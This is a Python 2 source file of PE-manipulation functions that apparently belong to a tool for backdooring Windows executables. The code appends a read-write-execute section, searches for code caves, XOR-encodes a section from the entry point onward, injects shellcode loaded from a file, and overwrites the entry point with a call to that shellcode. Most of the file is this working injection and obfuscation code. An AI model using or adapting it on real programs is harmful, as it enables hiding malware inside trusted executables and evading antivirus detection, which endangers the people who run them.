# PE related functions
import os
import random
import string
import struct
from f_generic import open_file
from binascii import hexlify
import pefile
from pwn import disasm, asm

#####################################################
# Utils
#####################################################

# Load PE file
def load_pe_file(filename):
    if os.path.isfile(filename):
        print "\n[*] Loading PE file (\"%s\")" % (filename)
        try:
            return pefile.PE(filename)
        except pefile.PEFormatError:
            print "[!] File (%s) doesn't seem to be a PE file" % (filename)
            sys.exit(1)
    else:
        print "\n[!] File (%s) doesn't exist" % (filename)
        sys.exit(1)

# Write new PE file
def write_PE_file(pe_struct, out_filename):
    if (out_filename == None) or len(out_filename) == 0:
        out_filename = "%s.exe" % ("".join(random.choice(string.ascii_letters) for x in range(10)))
    print "\n[*] Writing new PE file => \"%s\"" % (out_filename)
    pe_struct.write(filename=out_filename)

# Dump opcodes from PE, and display ASM
def dump_data(pe_struct, address, size):
    blob =  pe_struct.get_data(address, size)
    for l in disasm(blob, arch="i386").split("\n"):
        print "\t%s" % (l)

# Find a specific section (with name), and give it back (with index)
def find_section(pe_struct, section_name):
    index = 0
    for section in pe_struct.sections:
        if section_name in section.Name:
            return section, index
        index+=1
    return None,-1

# Create a section name (max size: 5)
def gen_section_name(new_sec_name):
    new_section_name = ".%s" % ("".join(random.choice(string.ascii_letters) for x in range(5)))
    if new_sec_name is not None:
        if len(new_sec_name) > 0 and len(new_sec_name) <= 5:
            if (new_sec_name[0] != "."):
                new_section_name = ".%s" % (new_sec_name)
            else:
                new_section_name = "%s" % (new_sec_name)
    return new_section_name

#####################################################
# Analysis
#####################################################

# Perform a quick analysis of PE file
def pe_quick_analysis(pe_struct):
    print "\n[*] Analysis"
    # Entry Point
    print " - Entry point: 0x%x" % (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)

    # ASLR
    if (pe_struct.OPTIONAL_HEADER.DllCharacteristics & 0x0040):
        print " - ASLR is enabled"
    else:
        print " - ASLR is disabled"

    # PE TYPE
    if (pe_struct.PE_TYPE == 0x10b):
        print " - PE 32-bit!"
    elif (pe_struct.PE_TYPE == 0x20b):
        print " - PE 64-bit!"
    else:
        print " - Unknown type!"

# Perform a deeper analysis of PE file
def pe_deeper_analysis(pe_struct):
    # Sections
    iterate_trough_pe_sections(pe_struct)
    # Requires pwntools
    print "\n - ASM instructions @entry point"
    dump_data(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 30)

#####################################################
# Sections
#####################################################

# Go through all PE sections (and display them)
def iterate_trough_pe_sections(pe_struct):
    print " - PE sections - %d section(s)" % (pe_struct.FILE_HEADER.NumberOfSections)
    print "\t\tVOffset\t\tVSize\t\tSize\t\tName"
    print "\t\t-----------------------------------------------------"
    for section in pe_struct.sections:
        print "\t\t%-10s\t%-10s\t%-10s\t%-10s" % (hex(section.VirtualAddress), hex(section.Misc_VirtualSize), hex(section.SizeOfRawData), section.Name.replace('\x00',''))

def adjust_optional_header(pe_struct):
    pe_struct.OPTIONAL_HEADER.SizeOfImage = pe_struct.sections[-1].VirtualAddress + pe_struct.sections[-1].Misc_VirtualSize
    pe_struct.OPTIONAL_HEADER.SizeOfCode = 0
    pe_struct.OPTIONAL_HEADER.SizeOfInitializedData = 0
    pe_struct.OPTIONAL_HEADER.SizeOfUninitializedData = 0

    for section in pe_struct.sections:
        if section.Characteristics & 0x00000020:
            pe_struct.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
        if section.Characteristics & 0x00000040:
            pe_struct.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
        if section.Characteristics & 0x00000080:
            pe_struct.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    return pe_struct

def create_new_section(pe_struct, sectionName = ".NewSec", virtualSize = 0x1000, pattern = "\x00", flags = 0xE00000E0):
    print "\n[*] Creating new section (\"%s\")" % (sectionName)

    # File alignment
    alignment = pe_struct.OPTIONAL_HEADER.FileAlignment
    # Section alignment
    SectionAlignment = pe_struct.OPTIONAL_HEADER.SectionAlignment
    # Get latest section
    latest_section = pe_struct.sections[-1]

    data = virtualSize * pattern
    offset_for_new_section = hex(latest_section.VirtualAddress + latest_section.SizeOfRawData)

    print " - Append %d bytes to PE file" % (virtualSize)

    # Append data to file
    full_length = latest_section.PointerToRawData + latest_section.SizeOfRawData
    pe_struct.__data__ = pe_struct.__data__[:full_length] + data

    # Find correct offset (with section alignment)
    virtualAddress = (pe_struct.sections[-1].VirtualAddress + pe_struct.sections[-1].Misc_VirtualSize - (pe_struct.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)

    # Add data (of the section header) to the file
    # 0x28 size of section header
    section_table_offset = pe_struct.DOS_HEADER.e_lfanew + 4 + pe_struct.FILE_HEADER.sizeof() + pe_struct.FILE_HEADER.SizeOfOptionalHeader
    section_offset = section_table_offset + pe_struct.FILE_HEADER.NumberOfSections * 0x28

    # Add data of the new section header to PE file
    pe_struct.set_bytes_at_offset(section_offset, sectionName)              # Name of new section
    pe_struct.set_dword_at_offset(section_offset + 0x08, virtualSize)       # virtualSize
    pe_struct.set_dword_at_offset(section_offset + 0x0C, virtualAddress)    # virtualAddress
    pe_struct.set_dword_at_offset(section_offset + 0x10, virtualSize)       # RawSize
    pe_struct.set_dword_at_offset(section_offset + 0x14, full_length)       # RawAddress
    pe_struct.set_dword_at_offset(section_offset + 0x18, 0x00000000)        # RelocAddress
    pe_struct.set_dword_at_offset(section_offset + 0x1C, 0x00000000)        # LineNumbers
    pe_struct.set_word_at_offset(section_offset + 0x20, 0x0000)             # RelocationsNumber
    pe_struct.set_word_at_offset(section_offset + 0x22, 0x0000)             # LinenumbersNumber
    pe_struct.set_dword_at_offset(section_offset + 0x24, flags)             # Flags

    # Add (+1) new section
    pe_struct.FILE_HEADER.NumberOfSections +=1

    pe_struct.parse_sections(section_table_offset) # Fetch the PE file sections
    pe_struct = adjust_optional_header(pe_struct)

    return pe_struct

# XOR a specific section
def xor_section(pe_struct, section_name, key=0xA0, offset=5):
    section, index = find_section(pe_struct, section_name)

    if section != None:
        result = ""
        # Go through all data, from Entry point to end of section
        for d in section.get_data(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + offset):
            result += chr(ord(d)^key)
        # Add XORed data @ VirtualAddress
        pe_struct.set_bytes_at_rva(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + offset, result)

# Look for code cave inside PE file's sections
def find_code_cave(pe_struct, min_size=100):
    print "\n[*] Looking for code caves"
    for section in pe_struct.sections:
        print "\t- Section: %s - @%s" % (section.Name.replace("\x00",""), hex(section.VirtualAddress))
        current_size = 0
        n = 0
        current_address = ""
        for d in section.get_data():
            if d == "\x00":
                current_size += 1
                current_address = section.VirtualAddress + n
            else:
                if current_size >= min_size:
                    print "\t  -> Found a code cave: %d bytes, starting @%s" % (current_size, hex(current_address))
                current_size = 0
                current_address = ""
            n+=1

#####################################################
# Shellcode
#####################################################

def open_shellcode_file(filename):
    shellcode_content = open_file(filename)
    shellcode = "\x90" * 4 + shellcode_content.decode('string-escape')
    print "\n[*] Loading shellcode (size: %d)" % (len(shellcode))
    return shellcode
    #print disasm(shellcode, arch="i386")

# Injection shellcode into "section_name", returns address
def inject_shellcode(pe_struct, shellcode, section_name):
    shellcode = "\x90" * 4 + shellcode
    section, index = find_section(pe_struct, section_name)
    pe_struct.set_bytes_at_rva(section.VirtualAddress, shellcode)
    print "\n[*] Injecting shellcode into section \"%s\"" % (section_name)
    return section.VirtualAddress

# Update entry point (relative offset from EntryPoint to Shellcode)
def update_entry_point_jmp_to_shellcode(pe_struct, addr_shellcode):
    jmp_addr = addr_shellcode - pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint - 1
    # relative JMP (use call to push @ on stack)
    update_entry_point(pe_struct, b"\xE8" + struct.pack("<I", jmp_addr))
    print "\n[*] Updating EntryPoint (@%s)" % (hex(jmp_addr))

# Update entry point with data
def update_entry_point(pe_struct, data):
    pe_struct.set_bytes_at_rva(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, data)
